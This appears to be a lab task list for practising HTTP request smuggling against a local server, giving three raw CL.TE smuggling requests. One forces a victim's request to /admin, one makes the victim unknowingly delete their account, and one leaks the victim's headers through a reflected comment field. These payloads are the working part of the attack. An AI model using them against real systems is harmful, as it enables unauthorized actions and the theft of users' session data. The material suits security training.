# Task list


## Task 1 - redirect to /admin

The idea is to use HTTP request smuggling to redirect a victim to another page, making the user perform an action without their consent.

```sh
POST / HTTP/1.1
Host: localhost:8080
Content-Length: 10
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
x-foo: x
```


## Task 2 - redirect to /DeleteAccount

The goal is to make the user unknowingly delete their account by redirecting them to the /DeleteAccount page.

```sh
POST / HTTP/1.1
Host: localhost:8080
Content-Length: 10
Transfer-Encoding: chunked

0

POST /deleteAccount HTTP/1.1
x-foo: x
```


## Task 3 - redirect to /postComment to leak headers

The objective is to leak sensitive headers by redirecting the user to the /postComment page. Having a page that makes persistent and public (aka "reflected" to a page) a POST parameter is indicative of http smuggling header leakage vulnerabilities.

```sh
POST / HTTP/1.1
Host: localhost:8080
Content-Length: 10
Transfer-Encoding: chunked

0

POST /postComment HTTP/1.1
Host: localhost:8080
Content-Type: application/x-www-form-urlencoded
Content-Length: 90

x=
```